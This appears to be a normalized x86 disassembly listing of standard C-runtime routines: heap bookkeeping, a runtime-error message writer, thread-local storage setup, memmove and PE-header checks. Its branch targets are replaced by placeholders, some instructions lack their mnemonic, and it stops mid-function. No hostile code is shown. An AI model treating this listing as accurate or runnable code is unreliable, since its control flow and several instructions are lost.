mov ecx [ edi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov esi [ ebp + 0x10 ]
add esi [ ebp - 0x4 ]
mov [ ebp + 0x10 ] esi
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx 0x80000000
cmp esi 0x20
jae r-xdata
mov edx [ ebp + 0xc ]
mov edi [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
sar edi 0x4
dec edi
lea ecx [ ecx + esi - 0x4 ]
cmp edi 0x3f
jbe r-xdata
add ecx 0xffffffe0
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] edi
lea eax [ eax + edx * 4 + 0x44 ]
mov ecx esi
jmp r-xdata
mov ecx esi
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] edi
push 0x3f
pop esi
lea ecx [ esi - 0x20 ]
shr ebx cl
lea ecx [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ecx esi
shr ebx cl
lea esi [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ esi ]
jne r-xdata
mov ebx [ ebp - 0xc ]
lea ebx [ ebx + edi * 8 ]
mov [ ebp + 0x10 ] ebx
mov ebx [ ebx + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ebx [ ebp + 0x10 ]
mov [ ecx + 0x8 ] ebx
mov [ ebx + 0x4 ] ecx
mov ebx [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov ebx [ ecx + 0x4 ]
cmp ebx [ ecx + 0x8 ]
jne r-xdata
push 0x3f
pop edi
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx 0x80000000
shr edx cl
or [ eax ] edx
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
lea eax [ edx + esi - 0x4 ]
mov [ eax ] ecx
mov [ ecx + eax - 0x4 ] ecx
jmp r-xdata
mov cl [ edi + eax + 0x4 ]
mov [ ebp + 0x13 ] cl
inc cl
mov [ edi + eax + 0x4 ] cl
cmp edi 0x20
jae r-xdata
lea eax [ esi + 0x1 ]
mov [ edx - 0x4 ] eax
mov [ edx + esi - 0x8 ] eax
jmp r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ edi - 0x20 ]
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
lea eax [ eax + edx * 4 + 0x44 ]
mov ecx edi
jmp r-xdata
mov ecx edi
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
mov edx 0x80000000
shr edx cl
or [ eax ] edx
sub_419869
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
mov ecx [ ebp + 0x8 ]
imul eax eax 0x14
add eax [ rw-data ]
add ecx 0x17
and ecx 0xfffffff0
mov [ ebp - 0x10 ] ecx
sar ecx 0x4
push ebx
dec ecx
cmp ecx 0x20
push esi
push edi
jge r-xdata
add ecx 0xffffffe0
or edx 0xffffffff
xor esi esi
shr edx cl
mov [ ebp - 0x8 ] edx
or esi 0xffffffff
shr esi cl
or [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx eax
jb r-xdata
mov ecx [ rw-data ]
mov ebx ecx
jmp r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ ebx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
cmp ebx eax
jne r-xdata
add ebx 0x14
mov [ rw-data ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
mov [ ebp - 0x4 ] edx
cmp edx 0xffffffff
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
mov edx [ eax + 0xc4 ]
lea ecx [ eax + 0x44 ]
mov ecx [ eax + edx * 4 + 0xc4 ]
mov edi [ eax + edx * 4 + 0x44 ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx ecx
jb r-xdata
mov edx [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov edx [ ecx + 0x84 ]
add ecx 0x4
jmp r-xdata
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + edx * 4 + 0x44 ]
xor edi edi
and ecx esi
jne r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ ebx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
cmp ebx ecx
jne r-xdata
test ecx ecx
jge r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
and ecx [ ebp - 0x8 ]
push 0x20
pop edi
jmp r-xdata
mov edi [ ecx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
add ebx 0x14
jmp r-xdata
add ecx ecx
inc edi
mov ecx [ ebp - 0xc ]
mov edx [ ecx + edi * 8 + 0x4 ]
mov ecx [ edx ]
sub ecx [ ebp - 0x10 ]
mov esi ecx
sar esi 0x4
dec esi
cmp esi 0x3f
mov [ ebp - 0x8 ] ecx
jle r-xdata
cmp ebx eax
jb r-xdata
cmp esi edi
je r-xdata
push 0x3f
pop esi
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx eax
jne r-xdata
test ecx ecx
je r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
add ebx 0x14
mov [ ebp + 0x8 ] ebx
push ebx
call sub_419480
pop ecx
mov ecx [ ebx + 0x10 ]
mov [ ecx ] eax
mov eax [ ebx + 0x10 ]
cmp [ eax ] 0xffffffff
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
mov esi [ ebp - 0x10 ]
add edx ecx
lea ecx [ esi + 0x1 ]
mov [ edx ] ecx
mov [ edx + esi - 0x4 ] ecx
mov esi [ ebp - 0xc ]
mov ecx [ esi ]
lea edi [ ecx + 0x1 ]
mov [ esi ] edi
test ecx ecx
jne r-xdata
mov [ edx ] ecx
mov [ ecx + edx - 0x4 ] ecx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
mov ecx [ edx + 0x8 ]
mov edi [ edx + 0x4 ]
mov [ ecx + 0x4 ] edi
mov ecx [ edx + 0x4 ]
mov edi [ edx + 0x8 ]
mov [ ecx + 0x8 ] edi
je r-xdata
cmp edi 0x20
mov ebx 0x80000000
jge r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx ecx
jb r-xdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
lea eax [ edx + 0x4 ]
cmp ebx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
lea ecx [ ecx + esi * 8 ]
mov edi [ ecx + 0x4 ]
mov [ edx + 0x8 ] ecx
mov [ edx + 0x4 ] edi
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
lea ecx [ edi - 0x20 ]
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea ecx [ eax + ecx * 4 + 0xc4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
and [ ecx ] ebx
dec [ edi ]
mov [ ebp - 0x14 ] ebx
jne r-xdata
mov ecx edi
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
mov [ ebp - 0x14 ] ebx
and ebx [ eax + ecx * 4 + 0x44 ]
mov [ eax + ecx * 4 + 0x44 ] ebx
dec [ edi ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx ecx
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov cl [ esi + eax + 0x4 ]
mov [ ebp + 0xb ] cl
inc cl
cmp esi 0x20
mov [ esi + eax + 0x4 ] cl
jge r-xdata
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx + 0x4 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov ebx [ ebp + 0x8 ]
and [ ebx ] ecx
jmp r-xdata
add ebx 0x14
call sub_4193d0
mov ebx eax
mov [ ebp + 0x8 ] ebx
test ebx ebx
jne r-xdata
and [ rw-data ] 0x0
cmp [ ebp + 0xb ] 0x0
jne r-xdata
cmp [ ebp + 0xb ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
lea edi [ eax + ecx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov esi 0x80000000
shr esi cl
or [ edi ] esi
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
or [ ebx + 0x4 ] edi
mov ecx esi
mov edi 0x80000000
shr edi cl
mov ecx [ ebp - 0x4 ]
or [ eax + ecx * 4 + 0x44 ] edi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
or [ ebx ] edi
sub_419b4e
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
xor esi esi
xor edi edi
mov [ ebp - 0x4 ] edi
cmp edi 0x17
jae r-xdata
inc edi
mov [ ebp - 0x4 ] edi
cmp edi 0x17
jb r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x3
call sub_41fa34
pop ecx
cmp eax 0x1
je r-xdata
cmp ebx [ edi * 8 + rw-data ]
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
push 0x3
call sub_41fa34
pop ecx
test eax eax
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
lea esi [ edi * 8 + rw-data ]
push [ esi ]
call sub_418e20
pop ecx
push eax
push [ esi ]
push ebx
call [ WriteFile@IAT ]
push r--data
mov ebx 0x314
push ebx
mov edi rw-data
push edi
call sub_418db8
add esp 0xc
test eax eax
je r-xdata
push 0x104
mov esi rw-data
push esi
push 0x0
mov [ rw-data ] 0x0
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_415289
add esp 0x14
push esi
call sub_418e20
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push 0x2fb
push esi
call sub_418db8
add esp 0xc
test eax eax
je r-xdata
xor esi esi
push esi
call sub_418e20
sub esi 0x3b
add eax esi
push 0x3
mov ecx rw-data
push r--data
sub ecx eax
push ecx
push eax
call sub_41f97f
add esp 0x14
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_415289
add esp 0x14
mov eax [ ebp - 0x4 ]
push [ eax * 8 + rw-data ]
push ebx
push edi
call sub_41f90b
add esp 0xc
test eax eax
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_415289
add esp 0x14
xor esi esi
push esi
push esi
push esi
push esi
push esi
call sub_415289
add esp 0x14
jmp r-xdata
push 0x12010
push r--data
push edi
call sub_41f7a2
add esp 0xc
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_415289
add esp 0x14
push r--data
push ebx
push edi
call sub_41f90b
add esp 0xc
test eax eax
je r-xdata
sub_419cf9
push 0x3
call sub_41fa34
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_419b4e
push 0xff
call sub_419b4e
pop ecx
pop ecx
push 0x3
call sub_41fa34
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_419d41
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call sub_419dec
pop ecx
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_419d71
mov edi edi
push ebp
mov ebp esp
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
push esi
call sub_418263
pop ecx
test eax eax
je r-xdata
push eax
push [ rw-data ]
call esi
call eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop ebp
retn
push [ ebp + 0x8 ]
call eax
mov [ ebp + 0x8 ] eax
mov eax [ eax + 0x1f8 ]
jmp r-xdata
test eax eax
je r-xdata
sub_419dec
mov edi edi
push ebp
mov ebp esp
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
push esi
call sub_418263
pop ecx
test eax eax
je r-xdata
push eax
push [ rw-data ]
call esi
call eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop ebp
retn
push [ ebp + 0x8 ]
call eax
mov [ ebp + 0x8 ] eax
mov eax [ eax + 0x1fc ]
jmp r-xdata
test eax eax
je r-xdata
sub_419e87
mov edi edi
push esi
push [ rw-data ]
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push [ rw-data ]
call sub_419dec
pop ecx
mov esi eax
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
sub_419ed8
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push eax
push [ rw-data ]
call sub_419dec
pop ecx
call eax
or [ rw-data ] 0xffffffff
jmp sub_418f26
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
sub_419f15
push 0xc
push r--data
call sub_415ff4
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] eax
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
test eax eax
je r-xdata
push esi
call sub_418263
pop ecx
mov [ esi + 0x70 ] edi
mov [ esi + 0xc8 ] 0x43
mov [ esi + 0x14b ] 0x43
mov [ esi + 0x68 ] rw-data
push 0xd
call sub_419057
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_419fea
push 0xc
call sub_419057
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push r--data
push eax
mov ebx [ GetProcAddress@IAT ]
call ebx
mov [ esi + 0x1f8 ] eax
push r--data
push [ ebp - 0x1c ]
call ebx
mov [ esi + 0x1fc ] eax
push [ esi + 0x6c ]
call sub_41fbc8
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_419ff3
call sub_416039
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_419ffc
mov edi edi
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_419e87
call eax
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x214
push 0x1
call sub_41aa23
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call sub_419dec
pop ecx
call eax
test eax eax
je r-xdata
push esi
call sub_415093
pop ecx
xor esi esi
push 0x0
push esi
call sub_419f15
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_41a08f
push 0x8
push r--data
call sub_415ff4
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_416039
retn 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_415093
pop ecx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_415093
pop ecx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_415093
pop ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_415093
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_415093
pop ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_415093
pop ecx
mov eax [ esi + 0x5c ]
cmp eax r--data
je r-xdata
push eax
call sub_415093
pop ecx
push 0xd
call sub_419057
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push eax
call sub_415093
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41a1a9
push 0xc
call sub_419057
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41a1b5
push esi
call sub_415093
pop ecx
push edi
call sub_41fc57
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_415093
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_41fa7f
pop ecx
sub_41a1be
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
push 0x0
push eax
call [ TlsSetValue@IAT ]
push 0x0
push [ rw-data ]
push [ rw-data ]
call sub_419dec
pop ecx
call eax
push [ ebp + 0x8 ]
call sub_41a08f
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
pop esi
push [ rw-data ]
push [ rw-data ]
call esi
call eax
mov [ ebp + 0x8 ] eax
sub_41a22c
mov edi edi
push esi
push edi
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov edi eax
test edi edi
je r-xdata
push esi
call sub_418263
pop ecx
call sub_419ed8
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
cmp [ rw-data ] 0x0
mov esi [ TlsSetValue@IAT ]
mov [ rw-data ] eax
je r-xdata
mov eax [ TlsGetValue@IAT ]
mov [ rw-data ] eax
mov eax [ TlsFree@IAT ]
mov [ rw-data ] sub_419e5e
mov [ rw-data ] esi
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push [ rw-data ]
push eax
call esi
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_41854d
push [ rw-data ]
call sub_419d71
push [ rw-data ]
mov [ rw-data ] eax
call sub_419d71
push [ rw-data ]
mov [ rw-data ] eax
call sub_419d71
push [ rw-data ]
mov [ rw-data ] eax
call sub_419d71
add esp 0x10
mov [ rw-data ] eax
call sub_418edb
test eax eax
je r-xdata
test eax eax
jne r-xdata
push sub_41a08f
push [ rw-data ]
call sub_419dec
pop ecx
call eax
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
call [ TlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
push 0x214
push 0x1
call sub_41aa23
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call sub_419dec
pop ecx
call eax
test eax eax
je r-xdata
push 0x0
push esi
call sub_419f15
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
retn
sub_41a3c0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x100
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_41a448 ]
jmp [ ecx * 4 + jump_table_41a4c8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_41a534 ]
pop esi
pop edi
pop ebp
jmp sub_418778
jmp [ ecx * 4 + jump_table_41a6d0 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_41a5d4 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_41a6d0 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_41a534 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_41a6d0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_41a534 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_41a534 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_41a534 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_41a6d0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_41a6d0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_41a6d0 ]
sub_41a730
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
xor edx edx
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
sete dl
mov eax edx
pop ebp
retn
sub_41a770
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
push edi
lea eax [ eax + ecx + 0x18 ]
test esi esi
jbe r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41a7c0
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_416050
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_41a730
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_41a770
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a87e
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
